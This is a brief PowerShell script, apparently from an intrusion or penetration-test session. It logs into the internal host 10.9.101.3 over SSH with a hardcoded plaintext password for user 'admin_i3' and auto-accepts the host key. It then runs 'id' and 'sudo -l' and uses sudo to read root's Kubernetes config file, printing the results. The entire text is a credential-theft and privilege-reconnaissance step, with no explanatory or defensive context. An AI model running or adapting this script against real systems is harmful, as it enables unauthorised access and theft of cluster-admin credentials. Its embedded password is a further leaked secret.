Import-Module Posh-SSH
$pw = ConvertTo-SecureString 'ElJ4I$xX' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("admin_i3",$pw)
try {
    $s = New-SSHSession -ComputerName 10.9.101.3 -Credential $cred -AcceptKey -ErrorAction Stop -ConnectionTimeout 10
    Write-Host "CONNECTED_AS_ADMIN_I3"
    $r1 = Invoke-SSHCommand -SSHSession $s -Command "id"
    Write-Host ("ID:"+$r1.Output)
    $r2 = Invoke-SSHCommand -SSHSession $s -Command "sudo -l"
    Write-Host ("SUDO:"+$r2.Output)
    $r3 = Invoke-SSHCommand -SSHSession $s -Command "sudo cat /root/.kube/config"
    Write-Host ("KUBECONFIG:"+$r3.Output)
    Remove-SSHSession $s | Out-Null
} catch {
    Write-Host ("ERR:"+$_)
}
